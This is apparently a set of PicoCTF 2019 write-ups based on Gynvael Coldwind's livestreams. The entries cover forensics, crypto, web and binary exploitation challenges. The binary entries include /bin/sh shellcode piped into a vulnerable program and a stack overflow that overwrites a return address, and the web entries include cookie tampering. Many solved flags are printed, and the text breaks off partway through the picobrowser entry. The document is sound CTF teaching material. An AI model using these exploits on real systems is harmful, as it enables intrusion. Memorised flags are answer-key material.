# Notes from Gynvael's Hacking Livestreams for PicoCTF Challenges

## Table of Contents

Title                                                                      | Category         | Points | Link to Gynvael's Stream
-------------------------------------------------------------------------- | ---------------- | ------ | ------------------------------
[The Factory’s Secret        ](#the-factorys-secret---general-skills)      | General          | 1      | 
[Glory of the Garden         ](#glory-of-the-garden---forensics)           | Forensics        | 50     | [Part 1 (33:36)](https://youtu.be/pYrGJuOUG7M?t=33m36s)
[Insp3ct0r                   ](#insp3ct0r---web-exploitation)              | Web              | 50     | [Part 1 (39:47)](https://youtu.be/pYrGJuOUG7M?t=39m47s)
[Let's Warm Up               ](#lets-warm-up---general-skills)             | General          | 50     | [Part 1 (48:19)](https://youtu.be/pYrGJuOUG7M?t=48m19s)
[The Numbers                 ](#the-numbers---cryptography)                | Crypto           | 50     | [Part 1 (50:26)](https://youtu.be/pYrGJuOUG7M?t=50m26s)
[Warmed Up                   ](#warmed-up---general-skills)                | General          | 50     | [Part 1 (1:00:06)](https://youtu.be/pYrGJuOUG7M?t=1h00m06s)
[2Warm                       ](#2warm---general-skills)                    | General          | 50     | [Part 1 (1:02:06)](https://youtu.be/pYrGJuOUG7M?t=1h02m06s)
[handy-shellcode             ](#handy-shellcode---binary-exploitation)     | Binary           | 50     | [Part 1 (1:05:30)](https://youtu.be/pYrGJuOUG7M?t=1h05m30s)
[practice-run-1              ](#practice-run-1---binary-exploitation)      | Binary           | 50     | [Part 1 (1:26:18)](https://youtu.be/pYrGJuOUG7M?t=1h26m18s)
[unzip                       ](#unzip---forensics)                         | Forensics        | 50     | [Part 1 (1:27:46)](https://youtu.be/pYrGJuOUG7M?t=1h27m46s)
[vault-door-training         ](#vault-door-training---reverse-engineering) | Reversing        | 50     | [Part 1 (1:30:02)](https://youtu.be/pYrGJuOUG7M?t=1h30m02s)
[13                          ](#13---cryptography)                         | Crypto           | 100    | [Part 1 (1:35:57)](https://youtu.be/pYrGJuOUG7M?t=1h35m57s)
[Bases                       ](#bases---general-skills)                    | General          | 100    | [Part 1 (1:38:50)](https://youtu.be/pYrGJuOUG7M?t=1h38m50s)
[Easy1                       ](#easy1---cryptography)                      | Crypto           | 100    | [Part 1 (1:47:50)](https://youtu.be/pYrGJuOUG7M?t=1h47m50s)
[First Grep                  ](#first-grep---general-skills)               | General          | 100    | [Part 1 (1:56:28)](https://youtu.be/pYrGJuOUG7M?t=1h56m28s)
[OverFlow 0                  ](#overflow-0---binary-exploitation)          | Binary           | 100    | [Part 1 (1:57:06)](https://youtu.be/pYrGJuOUG7M?t=1h57m06s)
[Resources                   ](#resources---general-skills)                | General          | 100    | [Part 1 (2:00:53)](https://youtu.be/pYrGJuOUG7M?t=2h00m53s)
[caesar                      ](#caesar----cryptography)                    | Crypto           | 100    | [Part 1 (2:01:28)](https://youtu.be/pYrGJuOUG7M?t=2h01m28s)
[dont-use-client-side        ](#dont-use-client-side---web-exploitation)   | Web              | 100    | [Part 1 (2:02:40)](https://youtu.be/pYrGJuOUG7M?t=2h02m40s)
[logon                       ](#logon---web-exploitation)                  | Web              | 100    | [Part 1 (2:05:42)](https://youtu.be/pYrGJuOUG7M?t=2h05m42s)
[strings it                  ](#strings-it---general-skills)               | General          | 100    | [Part 1 (2:11:07)](https://youtu.be/pYrGJuOUG7M?t=2h11m07s)
[vault-door-1                ](#vault-door-1---reverse-engineering)        | Reversing        | 100    | [Part 1 (2:13:31)](https://youtu.be/pYrGJuOUG7M?t=2h13m31s)
[what's a net cat            ](#whats-a-net-cat---general-skills)          | General          | 100    | [Part 1 (2:29:37)](https://youtu.be/pYrGJuOUG7M?t=2h29m37s)
[where are the robots        ](#where-are-the-robots---web-exploitation)   | Web              | 100    | [Part 1 (2:31:33)](https://youtu.be/pYrGJuOUG7M?t=2h31m33s)
[OverFlow 1                  ](#overflow-1---binary-exploitation)          | Binary           | 150    | [Part 1 (2:33:56)](https://youtu.be/pYrGJuOUG7M?t=2h33m56s)
[So Meta                     ](#so-meta---forensics)                       | Forensics        | 150    | [Part 1 (2:44:34)](https://youtu.be/pYrGJuOUG7M?t=2h44m34s)
[What Lies Within            ](#what-lies-within---forensics)              | Forensics        | 150    | [Part 1 (2:46:30)](https://youtu.be/pYrGJuOUG7M?t=2h46m30s)
[Extensions                  ](#extensions---forensics)                    | Forensics        | 150    | [Part 1 (3:08:03)](https://youtu.be/pYrGJuOUG7M?t=3h08m03s)
[shark on the wire 1         ](#shark-on-the-wire-1---forensics)           | Forensics        | 150    | [Part 1 (3:10:03)](https://youtu.be/pYrGJuOUG7M?t=3h10m03s)
[Based                       ](#based---general-skills)                    | General          | 200    | [Part 1 (3:20:40)](https://youtu.be/pYrGJuOUG7M?t=3h20m40s)
[Client-side-again           ](#client-side-again---web-exploitation)      | Web              | 200    | [Part 1 (3:25:29)](https://youtu.be/pYrGJuOUG7M?t=3h25m29s)
[First Grep: Part II         ](#first-grep-part-ii---general-skills)       | General          | 200    | [Part 1 (3:36:48)](https://youtu.be/pYrGJuOUG7M?t=3h36m48s)
[Flags                       ](#flags---cryptography)                      | Crypto           | 200    | [Part 1 (3:38:22)](https://youtu.be/pYrGJuOUG7M?t=3h38m22s)
[Mr-Worldwide                ](#mr-worldwide---cryptography)               | Crypto           | 200    | [Part 1 (3:44:54)](https://youtu.be/pYrGJuOUG7M?t=3h44m54s)
[Open-to-admins              ](#open-to-admins---web-exploitation)         | Web              | 200    | [Part 1 (4:05:34)](https://youtu.be/pYrGJuOUG7M?t=4h05m34s)
[Tapping                     ](#tapping---cryptography)                    | Crypto           | 200    | [Part 1 (4:21:28)](https://youtu.be/pYrGJuOUG7M?t=4h21m28s)
[la cifra de                 ](#la-cifra-de---cryptography)                | Crypto           | 200    | [Part 1 (4:23:14)](https://youtu.be/pYrGJuOUG7M?t=4h23m14s)
[picobrowser                 ](#picobrowser---web-exploitation)            | Web              | 200    | [Part 2 (22:42)](https://youtu.be/gHlundcY9GA?t=22m42s)
[plumbing                    ](#plumbing---general-skills)                 | General          | 200    | [Part 2 (29:03)](https://youtu.be/gHlundcY9GA?t=29m03s)
[rsa-pop-quiz                ](#rsa-pop-quiz---cryptography)               | Crypto           | 200    | [Part 2 (30:11)](https://youtu.be/gHlundcY9GA?t=30m11s)
[slippery-shellcode          ](#slippery-shellcode---binary-exploitation)  | Binary           | 200    | [Part 2 (51:31)](https://youtu.be/gHlundcY9GA?t=51m31s)
[vault-door-3                ](#vault-door-3---reverse-engineering)        | Reversing        | 200    | [Part 2 (1:16:40)](https://youtu.be/gHlundcY9GA?t=1h16m40s)
[whats-the-difference        ](#whats-the-difference---general-skills)     | General          | 200    | [Part 2 (1:34:10)](https://youtu.be/gHlundcY9GA?t=1h34m10s)
[where-is-the-file           ](#where-is-the-file---general-skills)        | General          | 200    | [Part 2 (1:39:58)](https://youtu.be/gHlundcY9GA?t=1h39m58s)
[WhitePages                  ](#whitepages---forensics)                    | Forensics        | 250    | [Part 2 (1:41:20)](https://youtu.be/gHlundcY9GA?t=1h41m20s)
[c0rrupt                     ](#c0rrupt---forensics)                       | Forensics        | 250    | [Part 2 (1:51:03)](https://youtu.be/gHlundcY9GA?t=1h51m03s)
[m00nwalk                    ](#m00nwalk---forensics)                      | Forensics        | 250    | [Part 2 (2:03:55)](https://youtu.be/gHlundcY9GA?t=2h03m55s)
[OverFlow 2                  ](#overflow2---binary-exploitation)           | Binary           | 250    | [Part 3 (17:33)](https://youtu.be/3x4nzymm33Q?t=17m33s)
[NewOverFlow-1               ](#newoverflow-1---binary-exploitation)       | Binary           | 200    | [Part 3 (32:17)](https://youtu.be/3x4nzymm33Q?t=32m17s)
[like1000                    ](#like1000---forensics)                      | Forensics        | 250    | [Part 3 (1:14:51)](https://youtu.be/3x4nzymm33Q?t=1h14m51s)
[vault-door-4                ](#vault-door-4---reverse-engineering)        | Reversing        | 250    | [Part 3 (1:32:45)](https://youtu.be/3x4nzymm33Q?t=1h32m45s)
[Irish-Name-Repo 1           ](#irish-name-repo-1---web-exploitation)      | Web              | 300    | [Part 3 (1:38:26)](https://youtu.be/3x4nzymm33Q?t=1h38m26s)
[flag_shop                   ](#flag_shop---general-skills)                | General          | 300    | [Part 3 (1:48:23)](https://youtu.be/3x4nzymm33Q?t=1h48m23s)
[asm1                        ](#asm1---reverse-engineering)                | Reversing        | 200    | [Part 3 (2:02:44)](https://youtu.be/3x4nzymm33Q?t=2h02m44s)
[New Overflow-2              ](#newoverflow-2---binary-exploitation)       | Binary           | 250    | [Part 4 (25:45)](https://youtu.be/gEPd1ref9s0?t=25m45s)
[asm2                        ](#asm2---reverse-engineering)                | Reversing        | 250    | [Part 4 (52:41)](https://youtu.be/gEPd1ref9s0?t=52m41s)
[CanaRy                      ](#canary---binary-exploitation)              | Binary           | 300    | [Part 4 (1:07:25)](https://youtu.be/gEPd1ref9s0?t=1h07m25s)
[Investigative Reversing 0   ](#investigative-reversing-0---forensics)     | Forensics        | 300    | [Part 4 (1:57:03)](https://youtu.be/gEPd1ref9s0?t=1h57m03s)
[asm3                        ](#asm3---reverse-engineering)                | Reversing        | 300    | [Part 5 (35:12)](https://youtu.be/gNvvZhpYHpw?t=35m12s)
[miniRSA                     ](#minirsa---cryptography)                    | Crypto           | 300    | [Part 5 (1:01:08)](https://youtu.be/gNvvZhpYHpw?t=1h01m08s)
[mus1c                       ](#mus1c---general-skills)                    | General          | 300    | [Part 5 (1:17:45)](https://youtu.be/gNvvZhpYHpw?t=1h17m45s)
[shark on the wire 2         ](#shark-on-the-wire-2---forensics)           | Forensics        | 300    | [Part 5 (1:29:57)](https://youtu.be/gNvvZhpYHpw?t=1h29m57s)
[leap-frog                   ](#leap-frog---binary-exploitation)           | Binary           | 300    | [Part 6 (31:24)](https://youtu.be/rK2y0wMS_9w?t=31m24s)
[reverse_cipher              ](#reverse_cipher---reverse-engineering)      | Reversing        | 300    | [Part 6 (1:00:27)](https://youtu.be/rK2y0wMS_9w?t=1h00m27s)
[stringzz                    ](#stringzz---binary-exploitation)            | Binary           | 300    | [Part 6 (1:13:13)](https://youtu.be/rK2y0wMS_9w?t=1h13m13s)
[Investigative Reversing 1   ](#investigative-reversing-1---forensics)     | Forensics        | 350    | [Part 6 (1:30:43)](https://youtu.be/rK2y0wMS_9w?t=1h30m43s)
[pastaAAA                    ](#pastaaa---forensics)                       | Forensics        | 350    | [Part 6 (1:43:42)](https://youtu.be/rK2y0wMS_9w?t=1h43m42s)

## Note:
If you're following along with your own picoctf account and solving challenges, not all values in the writeups will be the same as yours. For example, the last few characters of the flags are randomized, problem paths in the shell server are different for each user, and for the asm reversing problems, the values you get are different.

## Credits
All the credit goes to [Gynvael Coldwind](https://www.youtube.com/channel/UCCkVMojdBWS-JtH7TliWkVg) for making these streams. Check him out.  
I based the table format above on [this](https://github.com/shiltemann/CTF-writeups-public/blob/master/PicoCTF_2018/writeup.md#overview).  
J.V. for the timestamps in Parts 2, 3, and 4.

## The Factory's Secret - General Skills
Gynvael gave up on this. Maybe it was too easy.

## Glory of the Garden - Forensics
```console
$ file garden.jpg # This is to confirm that this file is actually a jpg
garden.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 2999x2249, frames 3
$ ls -la garden.jpg # Check size
-rw-rw-rw- 1 root root 2295192 Sep 28  2019 garden.jpg
$ strings garden.jpg | grep pico # Look for the string “pico” in the file
Here is a flag "picoCTF{more_than_m33ts_the_3y3b7FBD20b}"
```
Grep to win (used in super easy challenges or badly prepared challenges)

## Insp3ct0r - Web Exploitation
Just use “view page source”

## Let's Warm Up - General Skills 
Just use an online ascii table or hex to ascii converter or the following
```pycon
$ python
>>> chr(0x70)
'p'
```
or just `man ascii` 

## The Numbers - Cryptography 
There are only numbers no larger than 26 so the numbers just stand for the index of each letter in the alphabet. Manually do it or use this script from Gynvael:
```python
import string
a = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
k = [16, 9, 3, 15, 3, 20, 6, 20, 8, 5, 14, 21, 13, 2, 5, 18, 19, 13, 1, 19, 15, 14]

# We don't know if the index starts at 0 or 1
print(''.join([a[n-1] for n in k]))
print(''.join([a[n] for n in k]))
```

## Warmed Up - General Skills
0x3D to base 10

```
0x3        +      0xD =
3 * 16    +      0xD =
48         +      0xD =
48         +      13   =
61
```

## 2Warm - General Skills 
```pycon
$ python
>>> bin(42)
'0b101010'
```
or use math and do it the long way
```
2 * 16  =  0x20  = 32 
3 * 16  =  0x30  =  48

So 42 in decimal is 0x2A

Powers of 2: 8421

2      A
01    1010
```
## handy-shellcode - Binary Exploitation 
Connect to the shell server
```console
$ ls -la  /problems/handy-shellcode_4_037bd47611d842b565cfa1f378bfd8d9
total 732
drwxr-xr-x   2 root       root                4096 Sep 28  2019 .
drwxr-x--x 684 root       root               69632 Oct 10  2019 ..
-r--r-----   1 hacksports handy-shellcode_4     39 Sep 28  2019 flag.txt
-rwxr-sr-x   1 hacksports handy-shellcode_4 661832 Sep 28  2019 vuln
-rw-rw-r--   1 hacksports hacksports           624 Sep 28  2019 vuln.c
```
The gets() function is the vulnerable part of the code. This means we can use any character except '\n' or 0x0A
```c
void vuln(char *buf){
  gets(buf);
  puts(buf);
}
```

In main(), this line runs the input
```c
((void (*)())buf)();
```

If we just run the program and put in input like asdf, the program will crash since asdf aren't valid instruction that can be executed
```console
$ ./vuln
Enter your shellcode:
asdf
asdf
Thanks! Executing now...
Segmentation fault (core dumped)
```
As we can see, the program just segfaults.


However, if we use 0xC3 as the input, the program will run without crashing since 0xC3 is the 'ret' assembly instruction, so when we run the program with it as input, the program should exit without crashing.
```console
$ echo -e '\xC3' | ./vuln 
```

This confirms our assumptions of how the program runs. According to Gynvael, exploitation is a process where "everything can go wrong," so it's good to work with small steps to make sure our assumptions are correct.

Find out what architecture the shellcode should be:
```console
$ file vuln
vuln: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=7b65fbf1fba331b6b09a6812a338dbb1118e68e9, not stripped
```
This shows us that the program is a 32 bit program running on x86 Linux. 

To find some shellcode just google "x86 32 linux shellcode"
We find some shellcode for spawning a shell [here](http://shell-storm.org/shellcode/files/shellcode-827.php)
```
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
```

Let's give vuln the shellcode as input
```console
$ echo -e '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80` | ./vuln
Enter your shellcode:
1Ph//shh/binPS
Thanks! Executing now...
```
The shellcode above doesn't seem to work, but it actually does. The program just exits after successfully running the shellcode and spawning a shell. In order to interact with the shell, we need to keep stdin open.
```console
$ (echo -e '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`; cat) | ./vuln
Enter your shellcode:
1Ph//shh/binPS
Thanks! Executing now...
ls
flag.txt  vuln  vuln.c
cat flag.txt
picoCTF{h4ndY_d4ndY_sh311c0d3_55c521fe}
```
Gynvael saves his shellcode to a file and then uses `cat shellcode - | ./vuln` instead but the above does the same thing.

## practice-run-1 - Binary Exploitation 
Login to the shell server and just run the binary
```console
$ cd /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e
$ ls -la
total 84
drwxr-xr-x   2 root       root              4096 Sep 28  2019 .
drwxr-x--x 684 root       root             69632 Oct 10  2019 ..
-rwxr-sr-x   1 hacksports practice-run-1_0  7252 Sep 28  2019 run_this
$ ./run_this
picoCTF{g3t_r3adY_2_r3v3r53}
```

## unzip - Forensics 
```console
$ file flag.zip
flag.zip: Zip archive data, at least v2.0 to extract
$ strings flag.zip | grep pico # Grep2win doesn't work
$ unzip flag.zip
Archive:  flag.zip
  inflating: flag.png
$ ls
flag.png  flag.zip
```
The flag is in flag.png

## vault-door-training - Reverse Engineering 
The flag is in the source code

## 13 - Cryptography 
Just use a ROT13 decrypter
ROT13 is just a simple cipher.
Gynvael suggests implementing it if you haven't already; otherwise just use a decrypter online like [https://rot13.com/]. Time counts on CTFs, so just use the fastest method.

## Bases - General Skills 
Convert from Base64
Base64 is used to encode binary to a printable text

Python2
```pycon
$ python
>>> "bDNhcm5fdGgzX3IwcDM1".decode("base64")
'l3arn_th3_r0p35'
```

Python3
```pycon
$ python3
>>> import base64
base64.b64decode("bDNhcm5fdGgzX3IwcDM1")
b'l3arn_th3_r0p35'
```

## Easy1 - Cryptography 
Basic substitution cipher [Vigenère cipher](https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher)
Use the table

## First Grep - General Skills 
Grep to win
```console
$ cat file | grep pico
picoCTF{grep_is_good_to_find_things_ad4e9645}
```

## OverFlow 0 - Binary Exploitation 
This line of code means the  sigsegv_handler() function is called when the program crashes.
```c
signal(SIGSEGV, sigsegv_handler);
```

We just have to crash the program to get the flag read to us:
```c
void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag); // This prints our flag
  fflush(stderr);
  exit(1);
}
```

To crash the program, just overflow the buffer by sending in more than buffer length
```console
$ ./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
picoCTF{3asY_P3a5y1fcf81f9}
```

## Resources - General Skills 
Just go to the link and scroll down

## caesar  - Cryptography 
Caesar cipher is basically rot-n where n is a number. Use an online decoder like [http://theblob.org/rot.cgi]. 

## dont-use-client-side - Web Exploitation 
```javascript
function verify() {
  checkpass = document.getElementById("pass").value;
  split = 4;
  if (checkpass.substring(0, split) == 'pico') {
    if (checkpass.substring(split*6, split*7) == 'b956') {
      if (checkpass.substring(split, split*2) == 'CTF{') {
       if (checkpass.substring(split*4, split*5) == 'ts_p') {
        if (checkpass.substring(split*3, split*4) == 'lien') {
          if (checkpass.substring(split*5, split*6) == 'lz_e') {
            if (checkpass.substring(split*2, split*3) == 'no_c') {
              if (checkpass.substring(split*7, split*8) == 'b}') {
                alert("Password Verified")
                }
              }
            }
    
          }
        }
      }
    }
  }
  else {
    alert("Incorrect password");
  }
  
}
```
Just sort the substrings in order and then add them all to form the completed flag.

## logon - Web Exploitation 
Set the admin cookie to True

## strings it - General Skills 
Another grep to win
```console
$ strings strings | grep pico
picoCTF{5tRIng5_1T_c611cac7}
```

## vault-door-1 - Reverse Engineering 
Just sort the charAt() by indexes and combine the characters into the completed string.
```java
password.charAt(0)  == 'd'
password.charAt(29) == '7'
password.charAt(4)  == 'r'
password.charAt(2)  == '5'
password.charAt(23) == 'r'
password.charAt(3)  == 'c'
password.charAt(17) == '4'
password.charAt(1)  == '3'
password.charAt(7)  == 'b'
password.charAt(10) == '_'
password.charAt(5)  == '4'
password.charAt(9)  == '3'
password.charAt(11) == 't'
password.charAt(15) == 'c'
password.charAt(8)  == 'l'
password.charAt(12) == 'H'
password.charAt(20) == 'c'
password.charAt(14) == '_'
password.charAt(6)  == 'm'
password.charAt(24) == '5'
password.charAt(18) == 'r'
password.charAt(13) == '3'
password.charAt(19) == '4'
password.charAt(21) == 'T'
password.charAt(16) == 'H'
password.charAt(27) == '3'
password.charAt(30) == 'a'
password.charAt(25) == '_'
password.charAt(22) == '3'
password.charAt(28) == 'b'
password.charAt(26) == '0'
password.charAt(31) == '0'
```

## what's a net cat - General Skills 
```console
$ nc -v 2019shell1.picoctf.com 37851
Connection to 2019shell1.picoctf.com 37851 port [tcp/*] succeeded!
You're on your way to becoming the net cat master
picoCTF{nEtCat_Mast3ry_628e0244}
```  

## where are the robots - Web Exploitation 
Go to the robots.txt
You'll find that there is a 'secret' webpage: /8e32f.html
You'll find the flag there

The robots.txt is a "sign" to tell web crawlers and search engines like Google not to index or go to those webpages

## OverFlow 1 - Binary Exploitation
 Check what type of binary this is
```console
$ file vuln
vuln: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=5d4cdc8dc51fb3e5d45c2a59c6a9cd7958382fc9, not stripped
```

The vulnerable part of the code is the  `gets(buf);` in the vuln() function:
```c
void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}
```

The source code already has a flag() function helpfully placed in the program to read the flag out to us:
```c
void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}
```

We just have to overwrite the return address with the address of flag.

Get the address of flag
```console
$ objdump -d ./vuln | grep flag
080485e6 <flag>:
 8048618:       75 1c                   jne    8048636 <flag+0x50>
```
The address of the flag() function is 0x80485e6

Intel x86 uses little endian so use e6 85 04 08  when overwriting the ret address

```console
$ echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD\xe6\x85\x04\x08' | ./vuln
Give me a string and lets see what happens:
Woah, were jumping to 0x80485e6 !
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5fe1ff3d8}Segmentation fault (core dumped)
```
We use more than 64 bytes because there's some padding and other stuff we have to overwrite before we hit the return address (like the saved EBP). Experiment with different amounts of A's to see how many bytes are needed to reach the ret address.

## So Meta - Forensics 
Grep to win
```console
$ strings  pico_img.png | grep pico
picoCTF{s0_m3ta_43f253bb}
```

or use exiftool to look at metadata
```console
$ exiftool pico_img.png | grep pico
File Name                       : pico_img.png
Artist                          : picoCTF{s0_m3ta_43f253bb}
```

## What Lies Within - Forensics
```console
$ strings buildings.png | grep pico # Always grep to win
$ file buildings.png
buildings.png: PNG image data, 657 x 438, 8-bit/color RGBA, non-interlaced
$ exiftool buildings.png # Check the metadata
ExifTool Version Number         : 10.80
File Name                       : buildings.png
Directory                       : .
File Size                       : 611 kB
File Modification Date/Time     : 2019:09:28 10:54:24-04:00
File Access Date/Time           : 2020:05:05 16:41:04-04:00
File Inode Change Date/Time     : 2020:05:05 16:41:04-04:00
File Permissions                : rw-rw-rw-
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 657
Image Height                    : 438
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Image Size                      : 657x438
Megapixels                      : 0.288
```
Gynvael tries editing the headers to see if there are any hidden rows, opening in GIMP to see if any of the channels have data, and tries adjusting the color curves.

LSB (Least Significant Bit) Steganography turns out to be the solution. 

Data is hidden using the least significant bit. E.g. for a color 0x31708f, the f could be changed to a b to store data. The small change in color is not really noticeable.

Use an online [decoder](https://stylesuxx.github.io/steganography/). If you've never implemented LSB steg, then that's another thing you should implement according to Gynvael.

## Extensions - Forensics
```console
$ strings flag.txt | grep pico # Grep to win
$ file flag.txt
flag.txt: PNG image data, 1697 x 608, 8-bit/color RGB, non-interlaced
$ mv flag.txt flag.png # Change the extension to a png
```
Just change the extension and open the image

## shark on the wire 1 - Forensics
Use wireshark

Gynvael does the following: 

Filter packet bytes string pico
Notice that there are UDP packets with length 1 that seem to contain one character of the flag. Filter for UPD packets of length 1. Filter again with 10.0.0.2 since that is the IP address that seems to be associated with the flag data.

Gynvael then just uses "Follow UDP stream" to find the flag

## Based - General Skills 
Just convert binary to ascii, decimal to ascii, and octal to ascii, etc.
```pycon
$ python
>>> list = "146 141 154 143 157 156"
>>> base = 8
>>> ''.join([chr(int(x, base)) for x in list.split(" ")]) # Converts base to ascii
'falcon'
>>> "7461626c65".decode('hex') # Converts hex to ascii
'table'
```

Converting hex to ascii in python3
```pycon
$ python
>>> bytes.fromhex("7461626c65")
b'table'
```

## Client-side-again - Web Exploitation 
Look at the verify() function in the javascript
```javascript
function verify() {
    checkpass = document[_0x4b5b('0x0')]('pass')[_0x4b5b('0x1')];
    split = 0x4;
    if (checkpass[_0x4b5b('0x2')](0x0, split * 0x2) == _0x4b5b('0x3')) {
        if (checkpass[_0x4b5b('0x2')](0x7, 0x9) == '{n') {
            if (checkpass[_0x4b5b('0x2')](split * 0x2, split * 0x2 * 0x2) == _0x4b5b('0x4')) {
                if (checkpass[_0x4b5b('0x2')](0x3, 0x6) == 'oCT') {
                    if (checkpass[_0x4b5b('0x2')](split * 0x3 * 0x2, split * 0x4 * 0x2) == _0x4b5b('0x5')) {
                        if (checkpass['substring'](0x6, 0xb) == 'F{not') {
                            if (checkpass[_0x4b5b('0x2')](split * 0x2 * 0x2, split * 0x3 * 0x2) == _0x4b5b('0x6')) {
                                if (checkpass[_0x4b5b('0x2')](0xc, 0x10) == _0x4b5b('0x7')) {
                                    alert(_0x4b5b('0x8'));
                                }
                            }
                        }
                    }
                }
            }
        }
    } else {
        alert(_0x4b5b('0x9'));
    }
}
```
Isolate only the if cases
```js
if (checkpass[_0x4b5b('0x2')](0x0, split * 0x2) == _0x4b5b('0x3'))
if (checkpass[_0x4b5b('0x2')](0x7, 0x9) == '{n')
if (checkpass[_0x4b5b('0x2')](split * 0x2, split * 0x2 * 0x2) == _0x4b5b('0x4'))
if (checkpass[_0x4b5b('0x2')](0x3, 0x6) == 'oCT')
if (checkpass[_0x4b5b('0x2')](split * 0x3 * 0x2, split * 0x4 * 0x2) == _0x4b5b('0x5'))
if (checkpass['substring'](0x6, 0xb) == 'F{not')
if (checkpass[_0x4b5b('0x2')](split * 0x2 * 0x2, split * 0x3 * 0x2) == _0x4b5b('0x6'))
if (checkpass[_0x4b5b('0x2')](0xc, 0x10) == _0x4b5b('0x7'))
```

Replace split with 0x4 since we know split = 0x4
```js
if (checkpass[_0x4b5b('0x2')](0x0, 0x4 * 0x2) == _0x4b5b('0x3'))
if (checkpass[_0x4b5b('0x2')](0x7, 0x9) == '{n')
if (checkpass[_0x4b5b('0x2')](0x4 * 0x2, 0x4 * 0x2 * 0x2) == _0x4b5b('0x4'))
if (checkpass[_0x4b5b('0x2')](0x3, 0x6) == 'oCT')
if (checkpass[_0x4b5b('0x2')](0x4 * 0x3 * 0x2, 0x4 * 0x4 * 0x2) == _0x4b5b('0x5'))
if (checkpass['substring'](0x6, 0xb) == 'F{not')
if (checkpass[_0x4b5b('0x2')](0x4 * 0x2 * 0x2, 0x4 * 0x3 * 0x2) == _0x4b5b('0x6'))
if (checkpass[_0x4b5b('0x2')](0xc, 0x10) == _0x4b5b('0x7'))
```

Do math and simplify
```js
if (checkpass[_0x4b5b('0x2')](0, 8) == _0x4b5b('0x3'))
if (checkpass[_0x4b5b('0x2')](7, 9) == '{n')
if (checkpass[_0x4b5b('0x2')](8, 16) == _0x4b5b('0x4'))
if (checkpass[_0x4b5b('0x2')](3, 6) == 'oCT')
if (checkpass[_0x4b5b('0x2')](24, 32) == _0x4b5b('0x5'))
if (checkpass['substring'](6, 11) == 'F{not')
if (checkpass[_0x4b5b('0x2')](16, 24) == _0x4b5b('0x6'))
if (checkpass[_0x4b5b('0x2')](12, 16) == _0x4b5b('0x7'))
```

We can use the javascript console to figure out that \_0x4b5b('0x2') is just substring so all the checkpass[\_0x4b5b('0x2')] can be replaced with checkpass['substring']
```js
if (checkpass['substring'](0, 8) == _0x4b5b('0x3'))
if (checkpass['substring'](7, 9) == '{n')
if (checkpass['substring'](8, 16) == _0x4b5b('0x4'))
if (checkpass['substring'](3, 6) == 'oCT')
if (checkpass['substring'](24, 32) == _0x4b5b('0x5'))
if (checkpass['substring'](6, 11) == 'F{not')
if (checkpass['substring'](16, 24) == _0x4b5b('0x6'))
if (checkpass['substring'](12, 16) == _0x4b5b('0x7'))
```


Remove redundant checks
```js
if (checkpass['substring'](0, 8) == _0x4b5b('0x3'))
if (checkpass['substring'](8, 16) == _0x4b5b('0x4'))
if (checkpass['substring'](24, 32) == _0x4b5b('0x5'))
if (checkpass['substring'](16, 24) == _0x4b5b('0x6'))
```

Use the javascript console to figure out what \_0x4b5b('0x3') and so on are.
```js
if (checkpass['substring'](0, 8) == "picoCTF{")
if (checkpass['substring'](8, 16) == "not_this")
if (checkpass['substring'](24, 32) == "9d025}")
if (checkpass['substring'](16, 24) == "_again_3")
``` 

Piece the flag together using above:
picoCTF{not_this_again_39d025}

## First Grep: Part II - General Skills 
```console
$ rgrep pico
files1/file22:picoCTF{grep_r_to_find_this_af11356f}
```

## Flags - Cryptography 
Just use a navy flags chart [International Code of Signals](https://en.wikipedia.org/wiki/International_Code_of_Signals).  
Flag is all CAPS

## Mr-Worldwide - Cryptography 
First letter of city names of the GPS coordinates.

## Open-to-admins - Web Exploitation 
Gynvael adds an admin="True" cookie, but it doesn't do anything.  
Gynvael looks at session data.

But it turns out you just had to set the cookies:
In the javascript console
```javascript
> document.cookie="time=1400"
> document.cookie="admin=True"
```

## Tapping - Cryptography 
Just use a morse code [decoder](http://www.unit-conversion.info/texttools/morse-code/).

All uppercase
```pycon
$ python
>>> "picoctf{m0rs3c0d31sfun1818224575}".upper()
PICOCTF{M0RS3C0D31SFUN1818224575}
```

## la cifra de - Cryptography 
It uses the Vigenère cipher. Just use an online [decoder](https://www.guballa.de/vigenere-solver) using English. 

## picobrowser - Web Exploitation
Change the user agent to picobrowser  
Use Chrome DevTools and create a new emulated device with user agent string "picobrowser"

or use curl
```console
$ curl -A picobrowser https://2019shell1.picoctf.com/problem/12255/flag | grep "pico"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
